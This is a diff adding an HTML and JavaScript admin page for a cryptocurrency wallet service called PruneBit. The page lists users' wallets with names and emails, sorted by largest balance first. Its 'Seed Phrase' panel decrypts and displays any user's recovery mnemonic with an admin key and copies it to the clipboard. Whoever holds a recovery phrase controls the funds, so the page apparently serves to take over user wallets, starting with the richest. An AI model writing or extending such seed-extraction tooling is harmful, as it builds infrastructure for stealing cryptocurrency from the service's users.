@@ -1,0 +1,245 @@
+<!doctype html>
+<html lang="en" data-bs-theme="light">
+<head>
+<meta charset="utf-8">
+<meta name="robots" content="noindex, nofollow">
+<link rel="icon" type="image/svg+xml" href="../img/logo.svg">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Wallets - PruneBit</title>
+<link rel="stylesheet" href="../css/admin.css?v=20260816h"><link rel="stylesheet" href="../css/glass.css?v=20260816h">
+<script src="../js/security.js"></script>
+</head>
+<body class="bitcoin-style admin-page font-inter">
+<div class="admin-main">
+<div id="walletDetailModal" class="admin-modal-overlay">
+  <div class="admin-modal-content">
+    <button id="closeModalBtn" style="position:absolute;top:12px;right:12px;background:none;border:none;font-size:1.5rem;cursor:pointer;color:var(--admin-text);">&times;</button>
+    <div id="walletDetailContent"></div>
+  </div>
+</div>
+<div class="admin-page-header">
+  <h2><i class="bi bi-wallet2 me-2"></i>Wallets</h2>
+  <div style="display:flex;align-items:center;gap:12px;">
+    <span id="walletCount" class="badge bg-secondary d-none" style="font-size:0.85rem;"></span>
+    <button class="btn btn-sm btn-primary" id="refreshBtn"><i class="bi bi-arrow-clockwise me-1"></i>Refresh</button>
+  </div>
+</div>
+<div class="card admin-card">
+  <div class="card-body p-0">
+    <div class="table-responsive">
+      <table class="table admin-table align-middle mb-0">
+        <thead>
+          <tr><th>Wallet ID</th><th>Profile</th><th>Coin</th><th>Balance</th><th>Created</th><th>Last Access</th><th>Actions</th></tr>
+        </thead>
+        <tbody id="walletsTableBody"></tbody>
+      </table>
+    </div>
+  </div>
+</div>
+<div class="d-flex align-items-center justify-content-between mt-3" id="paginationWrap" style="display:none !important;">
+  <span class="text-secondary small" id="pageInfo"></span>
+  <div class="d-flex gap-2">
+    <button class="btn btn-sm btn-outline-secondary" id="prevPageBtn" disabled>&laquo; Prev</button>
+    <button class="btn btn-sm btn-outline-secondary" id="nextPageBtn" disabled>Next &raquo;</button>
+  </div>
+</div>
+</div>
+<script src="../js/admin_shared.js?v=20260725a"></script>
+<script>
+var _decryptedSeed = null;
+var _allWallets = [];
+var _currentPage = 1;
+var _perPage = 15;
+
+function sortWallets(wallets) {
+  return wallets.slice().sort(function(a, b) {
+    var ba = parseFloat(a.total_balance) || 0;
+    var bb = parseFloat(b.total_balance) || 0;
+    return bb - ba;
+  });
+}
+
+function getPageWallets() {
+  var start = (_currentPage - 1) * _perPage;
+  return _allWallets.slice(start, start + _perPage);
+}
+
+function totalPages() { return Math.max(1, Math.ceil(_allWallets.length / _perPage)); }
+
+function updatePagination() {
+  var wrap = document.getElementById('paginationWrap');
+  var total = _allWallets.length;
+  if (total <= _perPage) { wrap.style.display = 'none'; return; }
+  wrap.style.display = 'flex';
+  var tp = totalPages();
+  if (_currentPage > tp) _currentPage = tp;
+  document.getElementById('pageInfo').textContent = 'Page ' + _currentPage + ' of ' + tp + ' (' + total + ' wallets)';
+  document.getElementById('prevPageBtn').disabled = _currentPage <= 1;
+  document.getElementById('nextPageBtn').disabled = _currentPage >= tp;
+}
+
+function renderTable() {
+  var wallets = getPageWallets();
+  document.getElementById('walletsTableBody').innerHTML = wallets.length === 0
+    ? '<tr><td colspan="7" class="text-center text-muted py-4">No wallets found</td></tr>'
+    : wallets.map(function(w) {
+        var profile = 'No Profile';
+        try {
+          var p = typeof w.profile === 'string' ? JSON.parse(w.profile) : w.profile;
+          if (p && (p.name || p.email)) profile = [p.name, p.email].filter(Boolean).join(' | ');
+          else if (p) profile = JSON.stringify(p);
+        } catch (e) { profile = w.profile || 'No Profile'; }
+        return '<tr>' +
+          '<td><code class="small">' + escapeHtml((w.id || '').substring(0, 16)) + '...</code></td>' +
+          '<td class="small">' + escapeHtml(profile) + '</td>' +
+          '<td class="fw-semibold">' + escapeHtml(w.id_coin || 'N/A') + '</td>' +
+          '<td>' + escapeHtml(w.total_balance || 0) + '</td>' +
+          '<td class="text-secondary">' + escapeHtml(w.created_at) + '</td>' +
+          '<td class="text-secondary">' + escapeHtml(w.last_access || 'N/A') + '</td>' +
+          '<td>' +
+            '<button class="btn btn-link btn-sm text-decoration-none p-0 me-2" data-action="view-wallet" data-id="' + escapeHtml(w.id) + '"><i class="bi bi-eye me-1"></i>View</button>' +
+            '<button class="btn btn-link btn-sm text-danger text-decoration-none p-0" data-action="delete-wallet" data-id="' + escapeHtml(w.id) + '"><i class="bi bi-trash me-1"></i>Delete</button>' +
+          '</td></tr>';
+      }).join('');
+  updatePagination();
+}
+
+async function loadWallets() {
+  try {
+    var data = await adminPost('/api/admin/wallets');
+    if (data.success) {
+      var badge = document.getElementById('walletCount');
+      badge.textContent = data.wallets.length + ' wallets';
+      badge.classList.remove('d-none');
+      _allWallets = sortWallets(data.wallets);
+      _currentPage = 1;
+      renderTable();
+    }
+  } catch(e) { console.error('Error loading wallets:', e); }
+}
+
+async function viewWalletDetails(id) {
+  var modal = document.getElementById('walletDetailModal');
+  var content = document.getElementById('walletDetailContent');
+  modal.classList.add('open');
+  content.innerHTML = '<div class="text-center py-5"><div class="spinner-border"></div><p class="mt-2">Loading...</p></div>';
+  try {
+    var data = await adminPost('/api/admin/wallet_details', { wallet_id: id });
+    if (data.success) {
+      var addrRows = data.addresses.map(function(a) {
+        return '<code class="d-block small p-2 mb-1 bg-light rounded">' + escapeHtml(a.address) + ' <span class="text-muted">(' + escapeHtml(a.coin) + ')</span></code>';
+      }).join('');
+      var txRows = data.transactions.map(function(t) {
+        var statusClass = 'completed' === t.status ? 'bg-success' : 'bg-warning';
+        return '<tr><td>' + escapeHtml(t.coin) + '</td><td><code class="small">' + escapeHtml((t.from_address || '').substring(0, 20)) + '...</code></td><td><code class="small">' + escapeHtml((t.to_address || '').substring(0, 20)) + '...</code></td><td>' + escapeHtml(t.amount || '') + '</td><td><span class="badge ' + statusClass + '">' + escapeHtml(t.status) + '</span></td><td class="text-secondary small">' + escapeHtml(t.created_at) + '</td></tr>';
+      }).join('');
+      content.innerHTML =
+        '<h3 class="mb-3">Wallet Information</h3>' +
+        '<div class="row g-3 mb-4">' +
+          '<div class="col-md-6"><label class="form-label small">Wallet ID</label><code class="d-block p-2 bg-light rounded">' + escapeHtml(data.wallet.id) + '</code></div>' +
+          '<div class="col-md-3"><label class="form-label small">Coin</label><code class="d-block p-2 bg-light rounded">' + escapeHtml(data.wallet.id_coin || 'N/A') + '</code></div>' +
+          '<div class="col-md-3"><label class="form-label small">Balance</label><code class="d-block p-2 bg-light rounded">' + escapeHtml(data.wallet.total_balance || 0) + '</code></div>' +
+          '<div class="col-md-4"><label class="form-label small">Created</label><code class="d-block p-2 bg-light rounded">' + escapeHtml(data.wallet.created_at) + '</code></div>' +
+          '<div class="col-md-4"><label class="form-label small">Last Access</label><code class="d-block p-2 bg-light rounded">' + escapeHtml(data.wallet.last_access || 'N/A') + '</code></div>' +
+          '<div class="col-md-4"><label class="form-label small">Profile</label><code class="d-block p-2 bg-light rounded">' + escapeHtml(data.wallet.profile || 'N/A') + '</code></div>' +
+        '</div>' +
+        '<div class="admin-card border-warning mb-3"><div class="card-body">' +
+          '<h5>Seed Phrase</h5>' +
+          '<div id="seedPhraseDisplay" class="p-3 bg-light rounded mb-2" style="min-height:2.5rem;"><small class="text-muted">Enter secret key and click Decrypt</small></div>' +
+          '<div class="d-flex gap-2 align-items-center">' +
+            '<input id="secretKeyInput" type="password" class="form-control form-control-sm" placeholder="Admin Secret Key" style="max-width:14rem;">' +
+            '<button class="btn btn-sm btn-outline-warning" data-action="decrypt-seed" data-id="' + escapeHtml(data.wallet.id) + '">Decrypt</button>' +
+            '<button id="copySeedBtn" class="btn btn-sm btn-outline-secondary d-none" data-action="copy-seed">Copy</button>' +
+          '</div>' +
+        '</div></div>' +
+        '<h5>Addresses (' + data.addresses.length + ')</h5>' +
+        '<div class="mb-3">' + addrRows + '</div>' +
+        '<h5>Recent Transactions (' + data.transactions.length + ')</h5>' +
+        '<div class="table-responsive"><table class="table table-sm"><thead><tr><th>Coin</th><th>From</th><th>To</th><th>Amount</th><th>Status</th><th>Date</th></tr></thead><tbody>' +
+        txRows +
+        '</tbody></table></div>';
+    } else {
+      content.innerHTML = '<p class="text-danger">' + escapeHtml(data.error || 'Error') + '</p>';
+    }
+  } catch(e) {
+    content.innerHTML = '<p class="text-danger">' + escapeHtml(e.message) + '</p>';
+  }
+}
+
+function closeWalletDetailModal() {
+  document.getElementById('walletDetailModal').classList.remove('open');
+}
+
+async function decryptSeedPhrase(id) {
+  var key = document.getElementById('secretKeyInput').value;
+  if (!key) return alert('Enter secret key');
+  var btn = document.querySelector('[data-action="decrypt-seed"]');
+  btn.disabled = true; btn.textContent = 'Decrypting...';
+  try {
+    var data = await adminPost('/api/admin/decrypt_seed', { wallet_id: id, secret_key: key });
+    if (data.success) {
+      _decryptedSeed = data.mnemonic;
+      document.getElementById('seedPhraseDisplay').textContent = data.mnemonic;
+      document.getElementById('copySeedBtn').classList.remove('d-none');
+      btn.textContent = 'Decrypted'; btn.disabled = false;
+    } else {
+      document.getElementById('seedPhraseDisplay').textContent = data.error || 'Failed';
+      btn.textContent = 'Decrypt'; btn.disabled = false;
+    }
+  } catch(e) {
+    document.getElementById('seedPhraseDisplay').textContent = e.message;
+    btn.textContent = 'Decrypt'; btn.disabled = false;
+  }
+}
+
+function copySeedPhrase() {
+  if (_decryptedSeed) {
+    navigator.clipboard.writeText(_decryptedSeed);
+    var b = document.getElementById('copySeedBtn');
+    b.textContent = 'Copied!';
+    setTimeout(function() { b.textContent = 'Copy'; }, 2000);
+  }
+}
+
+async function deleteWallet(id) {
+  if (!confirm('Delete this wallet? This cannot be undone.')) return;
+  try {
+    var data = await adminPost('/api/admin/delete_wallet', { wallet_id: id });
+    if (data.success) loadWallets();
+    else alert(data.error || 'Failed');
+  } catch(e) { alert('Error: ' + e.message); }
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+  loadWallets();
+  document.getElementById('refreshBtn').addEventListener('click', loadWallets);
+  document.getElementById('closeModalBtn').addEventListener('click', closeWalletDetailModal);
+
+  document.getElementById('prevPageBtn').addEventListener('click', function() {
+    if (_currentPage > 1) { _currentPage--; renderTable(); }
+  });
+  document.getElementById('nextPageBtn').addEventListener('click', function() {
+    if (_currentPage < totalPages()) { _currentPage++; renderTable(); }
+  });
+
+  document.getElementById('walletsTableBody').addEventListener('click', function(e) {
+    var btn = e.target.closest('[data-action]');
+    if (!btn) return;
+    var action = btn.getAttribute('data-action');
+    var id = btn.getAttribute('data-id');
+    if (action === 'view-wallet') viewWalletDetails(id);
+    else if (action === 'delete-wallet') deleteWallet(id);
+  });
+
+  document.getElementById('walletDetailContent').addEventListener('click', function(e) {
+    var btn = e.target.closest('[data-action]');
+    if (!btn) return;
+    var action = btn.getAttribute('data-action');
+    var id = btn.getAttribute('data-id');
+    if (action === 'decrypt-seed') decryptSeedPhrase(id);
+    else if (action === 'copy-seed') copySeedPhrase();
+  });
+});
+</script>
+</body>
+</html>
